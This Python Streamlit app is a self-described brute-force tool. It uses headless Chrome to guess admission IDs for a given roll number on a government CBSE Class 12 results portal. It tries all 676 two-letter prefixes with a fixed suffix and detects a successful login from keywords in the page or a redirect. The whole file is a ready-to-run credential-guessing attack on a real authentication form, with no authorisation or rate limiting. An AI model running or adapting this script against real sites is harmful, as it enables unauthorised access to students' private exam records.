import streamlit as st
import os, time, string
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By

# ========================= CONFIGURATION =========================
URL = "https://umangresults.digilocker.gov.in/CBSE12th2026resultmayzaqw.html"

def get_driver():
    options = Options()
    options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--disable-gpu")
    # Reduced window size to save RAM
    options.add_argument("--window-size=1024,768") 
    
    render_bin = "/opt/render/project/src/.render/chrome/opt/google/chrome/google-chrome"
    if os.path.exists(render_bin):
        options.binary_location = render_bin
    
    # Use native Selenium Manager (No Service/DriverManager needed)
    return webdriver.Chrome(options=options)

def check_for_success(driver):
    try:
        page_source = driver.page_source.lower()
        # SUCCESS: If these words appear, we definitely found it
        success_keys = ["marks", "statement", "subject", "total", "grade", "pass"]
        if any(key in page_source for key in success_keys):
            return True, "Found Success Keywords"

        # SUCCESS: If the roll number input is gone, it redirected
        if len(driver.find_elements(By.ID, "rroll")) == 0:
            return True, "Redirected (Login input gone)"
            
        # FAILURE: If error message is visible
        err_msg = driver.find_elements(By.ID, "err_msg")
        if err_msg and err_msg[0].is_displayed() and "no data" in err_msg[0].text.lower():
            return False, "Fail: No data found"
            
    except:
        pass
    return False, "Inconclusive"

# ========================= UI =========================
st.set_page_config(page_title="Debug Mode", layout="wide")
st.title("🛠️ Brute Force Debugger")

col1, col2 = st.columns([1, 2])
with col1:
    roll_val = st.text_input("Roll Number", "18615899")
    suffix_val = st.text_input("Suffix", "994511")
    delay = st.slider("Wait (sec)", 0.5, 5.0, 2.0)
    start_btn = st.button("🚀 Run Debug Loop")

with col2:
    st.subheader("Live Browser View")
    debug_image = st.empty()
    debug_text = st.empty()

if start_btn:
    driver = None
    try:
        driver = get_driver()
        letters = string.ascii_uppercase
        combos = [f"{a}{b}" for a in letters for b in letters]
        
        for i, prefix in enumerate(combos):
            full_id = f"{prefix}{suffix_val}"
            
            # Force UI update
            debug_text.write(f"Testing: **{full_id}** ({i+1}/676)")
            
            driver.get(URL)
            time.sleep(1.0) # Page load wait
            
            try:
                driver.find_element(By.ID, "rroll").send_keys(roll_val)
                driver.find_element(By.ID, "admn_id").send_keys(full_id)
                driver.find_element(By.ID, "submit").click()
                
                time.sleep(delay)
                
                # Update debug view every attempt
                screenshot = driver.get_screenshot_as_png()
                debug_image.image(screenshot, caption=f"View for {full_id}")
                
                is_hit, reason = check_for_success(driver)
                
                if is_hit:
                    st.balloons()
                    st.success(f"🎉 FOUND! ID: {full_id}")
                    st.info(f"Reason: {reason}")
                    break
                    
            except Exception as e:
                debug_text.warning(f"Loop error on {full_id}: {e}")
                continue
                
    except Exception as e:
        st.error(f"Critical Startup Error: {e}")
    finally:
        if driver:
            driver.quit()
